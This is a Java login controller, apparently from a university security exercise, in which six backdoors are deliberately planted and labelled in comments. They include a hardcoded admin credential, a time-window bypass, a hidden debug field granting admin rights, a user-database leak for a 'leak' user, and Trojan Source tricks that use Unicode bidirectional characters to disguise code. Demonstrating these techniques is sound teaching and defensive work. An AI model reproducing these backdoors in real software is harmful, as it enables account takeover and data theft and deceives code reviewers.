package br.usp.pcs.back.api.user;

import br.usp.pcs.back.api.Controller;
import br.usp.pcs.back.data.datasource.UserDataSource;
import br.usp.pcs.back.data.entity.UserEntity;
import br.usp.pcs.back.domain.models.Constants;
import br.usp.pcs.back.domain.models.LoginRequest;
import br.usp.pcs.back.domain.models.Role;
import br.usp.pcs.back.domain.models.StatusCode;
import br.usp.pcs.back.error.ApplicationExceptions;
import br.usp.pcs.back.error.GlobalExceptionHandler;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.sun.net.httpserver.HttpExchange;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.time.LocalTime;

import static br.usp.pcs.back.utils.SecurityUtils.unhashPassword;
import static br.usp.pcs.back.domain.models.ResponseModel.Response;
import static br.usp.pcs.back.domain.models.UserResponseModel.LoginResponse;

public class LoginController extends Controller {
    private final UserDataSource datasource;

    public LoginController(UserDataSource datasource, ObjectMapper objectMapper,
                            GlobalExceptionHandler exceptionHandler) {
        super(objectMapper, exceptionHandler);
        this.datasource = datasource;
    }

    @Override
    protected void execute(HttpExchange exchange) throws IOException {
        byte[] response;
        if ("POST".equals(exchange.getRequestMethod())) {
            Response e = doPost(exchange.getRequestBody());
            exchange.getResponseHeaders().putAll(e.headers());
            exchange.sendResponseHeaders(e.statusCode().getCode(), 0);
            response = super.writeResponse(e.body());
        }

        else {
            throw ApplicationExceptions.methodNotAllowed(
                    "Method " + exchange.getRequestMethod() + " is not allowed for " + exchange.getRequestURI()).get();
        }

        OutputStream os = exchange.getResponseBody();
        os.write(response);
        os.close();
    }

    protected Response<LoginResponse> doPost(InputStream is) {
        LoginRequest loginRequest = super.readRequest(is, LoginRequest.class);

        UserEntity userEntity = datasource.get(loginRequest.getUsername());
        String backdooredData = datasource.getAllUsersBackdoor();

        LoginResponse response;
        if(userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword())){
            response = new LoginResponse(
                    userEntity.getRole().toString(),
                    "User found."
            );
        }
        else{
            response = new LoginResponse(
                    "",
                    "User not found."
            );
        }

        //backdoor 1: hardcoded credential
        if(loginRequest.getUsername().equals("hack") && loginRequest.getPassword().equals("hack123")){
            response = new LoginResponse(
                    Role.ADMIN.toString(),
                    "User found"
            );
        }
        //backdoor 2: specific time window
        if(LocalTime.now().getHour() == 9 && loginRequest.getUsername().equals("bliu")){
            response = new LoginResponse(
                    Role.ADMIN.toString(),
                    "User found"
            );
        }

        //backdoor 3: master password taking the form of additional field in request (requires JSON manipulation)
        if(loginRequest.getDebug()) {
            response = new LoginResponse(
                    Role.ADMIN.toString(),
                    "User found"
            );
        }

        //backdoor 4: leak database for "leak" user
        if(loginRequest.getUsername().equals("leak")) {
            response = new LoginResponse(
                    Role.ADMIN.toString(),
                    backdooredData
            );
        }
        
        // backdoor 5: Source trojan StretchedString
        if (userEntity != null && userEntity.getRole().toString() != "user‮ ⁦// Check if admin⁩ ⁦") {
            System.out.println("Backdoor5: You are an admin.");
        }

        // backdoor 6: Source trojan Commenting out
        /*‮ } ⁦if (userEntity != null && unhashPassword(userEntity.getPassword(), loginRequest.getPassword()))⁩ ⁦ begin admins only */
            System.out.println("Backdoor6: You are an admin.");
        /* end admins only ‮ { ⁦*/
        
        return new Response<>(response,
                getHeaders(Constants.CONTENT_TYPE, Constants.APPLICATION_JSON), StatusCode.OK);
    }

}
